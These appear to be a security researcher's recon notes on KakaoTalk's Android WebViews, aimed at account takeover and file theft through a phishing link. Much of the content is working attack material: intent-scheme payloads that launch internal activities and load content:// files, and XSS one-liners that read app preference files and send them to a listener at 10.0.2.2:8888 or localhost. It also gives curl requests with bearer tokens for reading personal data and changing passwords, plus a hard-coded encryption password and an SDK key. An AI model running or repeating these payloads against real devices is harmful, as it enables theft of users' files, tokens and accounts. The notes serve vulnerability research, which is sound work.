# WebView Recon

- [Goals](#goals)
- [Attack Vectors](#attack-vectors)
- [Findings](#findings)
- [To-Dos / Digging](#to-dos--digging)
  - [Tokens / Cookies](#tokens--cookies)
  - [Javascript Interfaces](#javascriptinterface)
  - [CSRF](#csrf)
  - [File Access / Content Providers](#file-access--content-providers)
  - [DownloadListener](#downloadlistenerondownloadstart)
  - [Deeplinks](#deeplinks)
  - [Kakao Pay](#kakao-pay)
  - [Misc](#misc)
- [Resources](#resources)
- [Appendix](#appendix)
  - [Payloads](#payloads)
  - [KGPopupActivity](#kgpopupactivity)

## Goals

- Account takeover via phishing link
- File exfiltration from KakaoTalk's application sandbox via phishing link

## Attack Vectors

- File load from insecure file locations
- Load data into WebViews via `intent:` scheme
- HTTP(S) MITM
- Create a malicious `Plus Friend` or `Kakao Business` page or an `Open Chat Room`
- Deep link parsing
  - Deep link —> open insecure WebView —> MITM —> run arbitrary JS code
  - Use the `intent:` scheme to start arbitrary components
  - Open attacker controlled website -> JS
  - Try different URL schemes (e.g., `javascript:`, `intent:`, `file://`, `content://`, `data://`,  etc.)
- Phishing (e.g., steal credentials by showing a legitimate KakaoTalk page)
  - https://accounts.kakao.com/

## Findings

- Account takeover (only via MITM in the same network)
  - Send malicious link
  - Steal token
  - `update_settings.json` -> change e-mail
  - Reset password
  - Install KakaoTalk for Windows
  - Login in with credentials
  - Brute-force 4-digit pin
- Token leakage in HTTP request headers:
  - `location.href = "intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=http://10.0.2.2:8888/;end"`
```bash
# Get phone number, e-mail address and other PII
curl -i -s -k -X $'GET' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'Authorization: d587a91fdf4c4e008145ffcd2282485000000016872655885310012q2jUmqPL3w-295c990ec4b3470b9df03827b4a9e38b5caf17cfc010bb18abab9aee622ec5f8' -H $'C: 5eb095d6-11de-4eb6-9076-4f3f3941ec58' -H $'Connection: close' \
    $'https://katalk.kakao.com/android/account/more_settings.json?os_version=30&model=SDK_GPHONE_ARM64&since=1678238174&lang=en&vc=2410170&email=2&adid=&adid_status=-1'

# Get friends
curl -i -s -k -X $'POST' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.1.7 An/11 en' -H $'Authorization: dc5cba9030874e758df0dbfa3ff0d27900000016873539108050012g3ESfF4vpW-5d977e2cb705405fdab021b372e3c19ca3fa84a4d159087a89507719141dbeef' -H $'A: android/10.1.7/en' -H $'Adid: a42e75cd-19e5-43a5-a23b-d2390c100942' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 134' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    --data-binary $'removed_contacts=%5B%5D&add_friends_to_limit=false&phone_number_type=1&reset_contacts=true&type=a&manual=false&contacts=%5B%5D&token=0' \
    $'https://katalk.kakao.com/android/friends/update.json'

# Update settings
curl -i -s -k -X $'POST' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.1.7 An/11 en' -H $'Authorization: dc5cba9030874e758df0dbfa3ff0d27900000016873539108050012g3ESfF4vpW-5d977e2cb705405fdab021b372e3c19ca3fa84a4d159087a89507719141dbeef' -H $'A: android/10.1.7/en' -H $'C: 7db8c5a8-978c-4009-8ae0-87c1caf91562' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 35' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    --data-binary $'usim_same_numbers=%5B%22false%22%5D' \
    $'https://katalk.kakao.com/android/account/update_settings.json'

# Get OAuth token
curl -i -s -k -X $'GET' \
    -H $'Host: kauth.kakao.com' -H $'Authorization: dc5cba9030874e758df0dbfa3ff0d27900000016873539108050012g3ESfF4vpW-5d977e2cb705405fdab021b372e3c19ca3fa84a4d159087a89507719141dbeef' -H $'User-Agent: KT/10.1.7 An/11 en;KAKAOTALK' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    $'https://kauth.kakao.com/oauth/authorize?client_id=24b2ff717557a8090279253242652f80&redirect_uri=kakao24b2ff717557a8090279253242652f80%3A%2F%2Foauth&response_type=code'

curl -i -s -k -X $'POST' \
    -H $'Host: kauth.kakao.com' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 271' -H $'Accept-Encoding: gzip, deflate' -H $'User-Agent: okhttp/4.9.3' -H $'Connection: close' \
    --data-binary $'client_id=24b2ff717557a8090279253242652f80&code=pYn2ksN-KH8bIaCHp3OwiM98G5xgdzkEvIgA4HDBhUT-uVcrTXzHiEgp1vA1HrERSESLXQoqJY8AAAGI3iGODg&grant_type=authorization_code&android_key_hash=S2FrYW9JIE1hc3RlciBLZXkg&redirect_uri=kakao24b2ff717557a8090279253242652f80%3A%2F%2Foauth' \
    $'https://kauth.kakao.com/oauth/token'
```
- I can start arbitrary components via the `intent:` scheme in `CommerceBuyActivity` (`kakaotalk://buy`)
  - I can exfiltrate files by sending Intents with `content://` URLs to `MyProfileSettingsActivity`:
```javascript
// Read Firebase Installation configuration
location.href = "intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json;end"
var data = document.querySelector('pre').innerHTML;
img = new Image();
img.src = 'http://10.0.2.2:8888?data=' + encodeURIComponent(data);
```
- I can open arbitrary URLs via `KGPopupActivity`, `MyProfileSettingsActivity` and `CommerceShopperWebViewActivity`:
  - `adb shell am start "intent:#Intent\;component=com.kakao.talk/.gametab.view.KGPopupActivity\;S.url=https://foo.com\;end"`
  - `location.href = "intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=http://10.0.2.2:8888/;end"`
  - `location.href = "intent:#Intent;component=com.kakao.talk/com.kakao.talk.commerce.ui.shopper.CommerceShopperWebViewActivity;S.URL=https://foo.com;end"`
  - `InAppBrowserActivity` -> `kakaointernalweb://host/q?url=https://www.foo.com&spamType=0&isPlusType=true`
  - `BizInAppBrowserActivity`-> `kakaotalk://bizwebview/open?url=http://www.foo.com`
- I can execute Javascript by:
  - Pointing to attacker-controlled URLs
  - Using the `data:` scheme, e.g.: `location.href = "intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=data%3Atext%2Fhtml%2C%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E;end"`
  - Using the `javascript:` scheme, e.g.: `location.href = "intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=javascript:alert%28%221%22%29;end"`
- I can access `/storage`, `/data/data/com.kakao.talk/files`, `/data/data/com.kakao.talk/cache` directories by opening `content:` URLs in `MyProfileSettingsActivity`, `KaKaoMailDocumentViewWebActivity`, and others, e.g.:
  - `location.href = "intent:#Intent;component=com.kakao.talk/.activity.kakaomail.KaKaoMailDocumentViewWebActivity;S.url=content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json;S.subContent=foo;end"`
  - Reading a cookie: `adb shell content read --uri "content://com.kakao.talk.FileProvider/external_files/emulated/0/Android/data/com.kakao.talk/KakaoTalk/cookie/.57f323da7592b0b5de1360de3da701b0d1aa6627"`
  - Using the `android-app:` scheme: `adb shell am start "android-app://#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=content://com.kakao.talk.FileProvider/external_files/emulated/0/Android/data/com.kakao.talk/KakaoTalk/cookie/.57f323da7592b0b5de1360de3da701b0d1aa6627\;end"`
- There are a couple of Javascript interfaces that access the user's location (see below)
- Auto-download to `/sdcard/Download` via Chrome (`app://kakaotalk/openURL?url=`)
- I can access other `BROWSABLE` Activities or Apps via the `android-app:` scheme, e.g.:
  - `location.href = "android-app://com.google.android.googlequicksearchbox/https/www.google.com"`
- `setWebContentsDebuggingEnabled` is enabled for most WebViews
- XSS in `com.kakao.talk.activity.cscenter.CsCenterActivity` (search field)
    - https://cs.kakao.com/search?query=%3Cscript%3Ealert%281%29%3C%2Fscript%3E (you need to click into the search field)

## To-Dos / Digging

Things to try out / dig deeper.

### Tokens / Cookies

- What's this cookie? -> `/sdcard/Android/data/com.kakao.talk/KakaoTalk/cookie/.57f323da7592b0b5de1360de3da701b0d1aa6627`
  - Encrypted with a hard-coded password (`KaKAOtalkForever`)
  - Plaintext: `{"sid":"4322E936A4CC18FC7041C1DD53CAFB58934880D7F88D7A514613BC1035786F"}`
  - Java Class: `n50.b` / `CookieFileUtils`
- How is the `_maldive_oauth_webapp_session_key` token generated? Required for a couple of REST APIs, e.g.:
```bash
# Check password
curl -i -s -k -X $'POST' \
    -H $'Host: auth.kakao.com' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' -H $'Accept: */*' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Origin: https://auth.kakao.com' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' -H $'Content-Length: 99' \
    -b $'_maldive_oauth_webapp_session_key=0795170f93efe069384cedf7750c6a6d' \
    --data-binary $'client_id=88215199793288849&lang=en&os=android&v=10.1.7&webview_v=2&password=kBB5mmmE&check_type=11' \
    $'https://auth.kakao.com/kakao_accounts/check_password.json'

# Change password
curl -i -s -k -X $'POST' \
    -H $'Host: auth.kakao.com' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' -H $'Accept: */*' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Origin: https://auth.kakao.com' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' -H $'Content-Length: 120' \
    -b $'_maldive_oauth_webapp_session_key=0795170f93efe069384cedf7750c6a6d' \
    --data-binary $'client_id=88215199793288849&lang=en&os=android&v=10.1.7&webview_v=2&password=kBB5mmmE&new_password=kBB5mmmE&reset_type=3' \
    $'https://auth.kakao.com/kakao_accounts/check_restricted_password.json'
```

### @JavascriptInterface

- `KvKakaoViewJavascriptInterface` -> `kakaoview` interface
  - `loadURL()`
- `KvKakaoTalkJavascriptInterface`
  - `getCurrentLocation(String str)`
- `BaseWebViewActivity` -> `webview` interface
  - `saveImage()`
- `NamecardWebActivity` -> `saveImage()`
- `JdSearchWebScriptInterface` -> `kakaoweb` interface
  - `saveImage()`
  - `requestLocationString(final String str)`
- `JdSearchWebCardScriptInterface` -> `kakaotalk` interface
  - `requestLocation()`
  - `requestLocationWithParam(String str)`
  - `updateJson(String str)`
- `VCBridgeJavascriptInterface` -> `vc` interface -> used in `ShakeWebActivity`
  - `checkKakaoCertAvailable(String str)`
  - `writeData()`
  - `readData()`
- `DigitalDocsWebActivity` -> `digitalDocs` interface
  - `webview_mount()` (seems to load a URL)
- `KakaoBizWebJavascriptInterface` -> `kakaoBizWebExtensionNative` interface
  - `executeBizWebExtension()`
- `kakaotalk://order` (`KakaoOrderActivity`) -> `kakaoTalk` interface
  - `getAuthorization()`
  - `getGeolocation()`
  - `listenSms()`
  - `openKakaoOrderFileChoose()`
  - `openKakaoOrderShortcut()`
- `KakaoHairshopActivity` (`kakaotalk://hairshop`) -> `kakaoTalk` interface
  - `getAuthorization()`
  - `getGeolocation()`
  - `getGeolocationForce()`
- `CommerceMakersActivity` (`kakaotalk://makers`) -> `kakaoTalk` interface
  - `openExternalUrl(String str)`
- `KGWebView` (`kakaotalk://gamecenter`) -> `Gametab` interface
  - `api(String str, String str2, String str3)` -> available commands in `KGWebViewCommands` class
  - `kgapi(String str, String str2, String str3`
- `PlusHomeWebLayout` -> `kakaoTalk` interface
  - `getGeolocation()`
  - `getGeolocationForce()`
  - `isLocationAgreed()`
- `CheckoutActivity` -> `kakaotalk` interface
  - `addTalkChannel(long j)`
- `SubscriptionIapWebActivity` -> `kakaoSubscription` interface
  - `requestInAppPurchase(String str)`
- `PlusEventScriptInterface`
  - `copyClipboard(String str, String str2)`
- `WebViewSignedLocationInterface` -> `native` interface
  - `reqSignInLocation(String str, String str2)`
- `KakaoTvPayJavascriptInterface` -> `kakaotv` interface -> used in `KakaoTvPayActivity`
  - `purchaseItem(String str)`

### CSRF

- Test/check `kakaotalk://settings`
- Interesting Activities:
  - `ChangePhoneNumberActivity`
  - `com.kakao.talk.activity.setting.p134pc.PCSettingsActivity`
  - `com.kakao.talk.activity.setting.p134pc.PCSettingsAuthenticationNumberActivity`
  - `com.kakao.talk.activity.setting.DeleteAccountAgreementActivity`
  - `com.kakao.talk.activity.setting.DeleteAccountCheckOthersActivity`
  - `com.kakao.talk.activity.setting.DeleteAccountResultActivity`
  - `com.kakao.talk.activity.setting.EncryptionKeysInformationActivity`
  - `com.kakao.talk.activity.setting.EncryptionKeysInformationDetailActivity`
  - `com.kakao.talk.zzng.settings.MyPinSettingsActivity`

### File Access / Content Providers

- Investigate `FileDownloadHelperActivity`
  - `location.href = "intent:#Intent;component=com.kakao.talk/.activity.file.FileDownloadHelperActivity;action=com.kakao.talk.activity.file.FileDownloadHelperActivity.ACTION_FILE_OPEN;S.file_uri=file:///external_files/test.txt;end"` -> `Failed to find configured root that contains /external_files/test.txt`
- `setAllowFileAccessFromFileURLs`
  - Create a JS file in `Download` folder (called `foo.html`)
  - `foo.html` reads `file:////data/user/0/com.kakao.talk/shared_prefs/talk_pass_preferences.xml`
  - Access `foo.html` file via `content:` scheme in some Webview that supports `setAllowFileAccessFromFileURLs`
  - `XMLHttpRequest` still won't work -> not a `file://` URL?
  - Need to be able to create/download files in/to `Download` folder
- Cannot steal files from unprotected Content Providers that cannot be rendered in a Webview (e.g., `LocalUser_DataStore.pref.preferences_pb` in `files` folder). Text files work fine: `content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json`.
  - `CommerceShopperWebViewActivity` doesn't auto-download but also doesn't render binary files

### DownloadListener.onDownloadStart

- Check `p21.e` / `DownloaderTask` class (`com.kakao.talk.widget.webview.WebViewHelper` -> `processDownload()` -> `C42792b.m9697b()` -> `DownloaderTask.m16277b()`)
  - **TO-DO**: Try path traversal
  - Bypass `DownloaderTask` checks
  - Downloads files to `/sdcard/Download/` directory
  - Not able to overwrite files
  - Play with `data:` URIs (`data:[<mediatype>][;base64],<data>`)
- **TO-DO:** I *might* be able to force WebViews to auto-download files by pointing them to an attacker-controlled website. Required headers:
  - `Content-Type: application/octet-stream`
  - `content-disposition: attachment; filename=foo.html`
- Investigate `com.kakao.talk.widget.webview.WebViewHelper` class:
  - `downloadImagesToSdCard()`
	- `processDownload()` -> `C42792b.m9697b()` -> `DownloaderTask.m16277b()`

### Deeplinks

- Check `kakaolink://` links
- `InAppBrowserActivity` -> `kakaotalk://inappbrowser`
- `KakaoOrderActivity` (`kakaotalk://order`)
- `kakaotalk://store`
  - HTTP request to `store.kakaofriends.com` —> Change `Location` in HTTP Response Header to a different URL
- `KakaoHairshopActivity` (`kakaotalk://hairshop`)
- `KakaoStyleActivity` (`kakaotalk://style`)
- `BillingWebActivity` (`kakaotalk://mywallet/go`)
- `CommerceGiftActivity` (`kakaotalk://gift/home?url=shortcut&input_channel_id=1017`)
  - Check `app://` links
- `CheckoutActivity` (`kakaotalk://checkout/open?url=`)

### Kakao Pay

- Set up Kakaopay —> Get Korean phone number / SIM card
  - `kakaotalk://kakaopay/billgates?url=`
  - `kakaotalk://kakaopay/web?url=`
  - `kakaotalk://kakaopay/payweb?url=`
  - `kakaopay://payweb?url=`

### Misc

- Try to send intents to `com.kakao.talk.service.MessengerService` (via `kakaotalk://buy` Webview)
- Clicking on https://auth.kakao.com in the KakaoTalk UI leads to `KakaoAccountSettingsActivity`
- Switch to a different Activity via `continue` parameter -> `https://auth.kakao.com/kakao_accounts?continue=kakaotalk://main`
- When opening `content:` URIs I end up in the `null` origin -> `XMLHttpRequest` to `http` scheme works here

## Resources

- [CORS and WebView API](https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/cors-and-webview-api.md)
- [Intent Scheme](https://www.mbsd.jp/Whitepaper/IntentScheme.pdf)
- [Defcon WebView Training](https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20workshops/DEF%20CON%2026%20-%20Workshop-David-Turco-and-Jon-Overgaard-Christiansen-Wheres-My-Browser-Learn-Hacking-iOS-and-Android-WebViews.pdf)
- [Android security checklist: WebView](https://blog.oversecured.com/Android-security-checklist-webview/)
- [Reviewing Android Webviews fileAccess attack vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)

## Appendix

### Payloads

Test payloads:

```javascript
<img src=1 onerror=\"alert(1);alert('XSS')\"/>
```

```javascript
var x=new XMLHttpRequest(); x.open('GET', 'http://localhost:8000/', true); x.send();
```

```javascript
<img src=1 onerror=\"var xhttp_comment = new XMLHttpRequest();xhttp_comment.open('GET', 'http://localhost:8000/', true);xhttp_comment.send();\"/>
```

Exfiltration payload:

```javascript
<img src=1 onerror=\"
var xhttp_comment = new XMLHttpRequest();

xhttp_comment.onreadystatechange = function() {
    if (this.readyState == 4) {
        img = new Image();
        img.src = 'http://10.0.2.2:8888?data=' + encodeURIComponent(this.responseText);
    }
};

xhttp_comment.open('GET', 'file:////data/user/0/com.kakao.talk/shared_prefs/talk_pass_preferences.xml', true);
xhttp_comment.send();
\"/>
```

One-liner:

```javascript
<img src=1 onerror=\" var x = new XMLHttpRequest(); x.onreadystatechange = function() { if (this.readyState == 4) { img = new Image(); img.src = 'http://localhost:8000?data=' + encodeURIComponent(this.responseText); } }; x.open('GET', 'file:////data/user/0/com.kakao.talk/shared_prefs/talk_pass_preferences.xml', true); x.send(); \"/>
```

### KGPopupActivity

- `KGPopupActivity` (`kakaotalk://gamecenter`)
- `webViewSettings.setAllowFileAccessFromFileURLs(true);`
- `webViewSettings.setAllowUniversalAccessFromFileURLs(true);`
- Intent scheme allowed (but compontent and selector are set to null)
- There are `KG`, `Kakao` and `kakaoweb` JS APIs
- JavaScript-Native Bridge
  - `Gametab.api("talk/toolbar/show", '', '');` —> defined in class `KGWebViewCommands`
- Key for Kakaotalk Javascript SDK: `8fa1ffbc074c716c201ce0074d5f798e`

Send intents in JS:

```javascript
// Open Game Center (KGPopupActivity)
location.href = "intent://gamecenter#Intent;scheme=kakaotalk;end";
// Open Music Player
location.href = "intent:#Intent;action=com.kakao.talk.intent.action.OPEN_MUSIC_PLAYER;end"
// Open any URL in KakaoTalk browser
location.href = "intent:#Intent;action=foo;S.browser_fallback_url=https://foo.com;end"
```

Via ADB:

```bash
# Open Gift Store
adb shell am start "intent:#Intent\;component=com.kakao.talk/.commerce.ui.gift.CommerceGiftActivity\;end"
```

`intent:` parsing observations:
- Intent scheme parsing happening in `URIController.d` method
  - `parseUri.addCategory("android.intent.category.BROWSABLE");`
  - `parseUri.setSelector(null);`
  - `parseUri.setComponent(null);`
  - `action` is allowed
  - `package` opens the Playstore
  - `data` part is parsed for `http` and `https` schemes
  - malformed `intent://` URL -> `"about:blank"` WebView
  - `component=null` -> Google Settings Backup Activity